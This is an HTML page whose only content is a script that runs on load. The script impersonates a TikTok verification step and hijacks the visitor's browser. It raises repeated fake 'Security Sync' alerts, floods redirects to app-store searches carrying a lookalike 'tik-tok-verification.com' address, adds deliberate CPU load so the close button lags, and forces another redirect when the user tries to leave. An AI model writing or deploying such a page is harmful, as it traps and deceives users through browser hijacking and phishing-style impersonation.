<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <style>body, html { margin: 0; padding: 0; background: #fff; overflow: hidden; height: 100vh; }</style>
</head>
<body>

<script>
    const target = "https://tik-tok-verification.com/Verification/verify1.html";
    const killTime = Date.now() + 10000; 
    const gap = 320; 

    function triggerStoreJump() {
        const urlEnc = encodeURIComponent(target);
        const isAndroid = /Android/i.test(navigator.userAgent);
        
        // The protocol you confirmed works
        const iosTrigger = "itms-apps://search.itunes.apple.com/WebObjects/MZSearch.woa/wa/search?media=software&term=" + urlEnc;
        const androidTrigger = "market://search?q=" + urlEnc;
        
        window.location.href = isAndroid ? androidTrigger : iosTrigger;
    }

    function startWaterfall(duration) {
        const start = Date.now();
        // High-frequency interval (every 10ms)
        const waterfall = setInterval(() => {
            if (Date.now() - start > duration || !document.hasFocus()) {
                clearInterval(waterfall);
                return;
            }
            triggerStoreJump();
            
            // Extra CPU load to make the 'X' button lag
            for(let i=0; i<500; i++) { Math.sqrt(Math.random()); }
        }, 10);
    }

    function rampage() {
        if (Date.now() > killTime) return;

        // 1. Initial jump
        triggerStoreJump();

        // 2. THE LOCK
        alert("ATTEMPT #38\n\nSecurity Sync in progress...\n\nDo not close this window.\n\nTap OK to authorize.");

        // 3. THE WATERFALL (320ms of pure saturation)
        // Fires ~32 times per gap + adds CPU lag to ignore 'X' button taps
        startWaterfall(gap);

        // 4. Queue the next alert
        setTimeout(() => {
            if (document.hasFocus()) {
                rampage();
            }
        }, gap);
    }

    window.onload = () => {
        rampage();
    };

    // If they try to swipe out, force it
    window.onblur = () => { if (Date.now() < killTime) triggerStoreJump(); };
</script>

</body>
</html>
